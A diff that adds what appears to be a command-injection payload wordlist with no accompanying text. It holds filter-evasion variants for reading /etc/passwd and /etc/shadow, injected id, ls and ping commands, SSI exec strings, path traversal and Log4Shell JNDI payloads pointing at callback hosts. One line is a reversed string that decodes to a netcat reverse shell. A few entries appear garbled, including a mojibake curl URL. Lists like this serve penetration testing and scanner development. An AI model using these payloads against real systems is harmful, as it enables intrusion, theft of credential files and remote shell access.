@@ -1,0 +1,108 @@
+;+$u+cat+/etc$u/passwd+\#
+/???/??t+/???/??ss??
+/?in/cat+/et?/passw?
+/etc/passwd
+/ec/asswd
+/??c/?asswd
+/??c/?assw?
+curl -L <http://¼ÄÄ¼Áº.¸ÄÂ>
+;+$u+cat+/etc$u/passwd$u
+/???/??t /???/??ss??'."" --
+$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
+cd..\..\..\..\ && dir
+cd..&&cd..&&cd..&&cd..&&dir
+../../../../../../ec/ps*d{{' http://server/...
+system(cat /etc/passwd);
+~${ OGNL Payload }
+t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}
+${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:1}:}}}ldap://xxx.dnslog.cn}
+${jndi${123%25ff:-}:ldap://xxx.dnslog.cn}
+${jndi${nagli:-:}ldap:${::-/}/${hostName}.anything.interact.sh/a}}
+cat$IFS$9${PWD%%[a-z]}ec${PWD%%[a-z]*}p?ss??
+cat etc/paswd
+cat /e"t"c/pa"s"swd
+cat /'e'tc/pa's'swd
+cat  /etc/pa??wd
+cat /etc/pa*wd
+cat /et``c/passw``d
+cat /et$()c/pa$()sswd
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+";id;"
+';id;'
+;id;
+;id
+;netstat -a;
+"|id|"
+'|id|'
+|id
+|/usr/bin/id
+|id|
+"|/usr/bin/id|"
+'|/usr/bin/id|'
+|/usr/bin/id|
+"||/usr/bin/id|"
+'||/usr/bin/id|'
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+"\n/bin/ls -al\n"
+'\n/bin/ls -al\n'
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%22%0A/usr/bin/id%0A%22
+%27%0A/usr/bin/id%0A%27
+%0A/usr/bin/id%0A
+%0Aid%0A
+"& ping -i 30 127.0.0.1 &"
+'& ping -i 30 127.0.0.1 &'
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+| id
+& id
+; id
+%0a id %0a
+$;/usr/bin/id
+cat /et${neko}c/pas${poil}swd
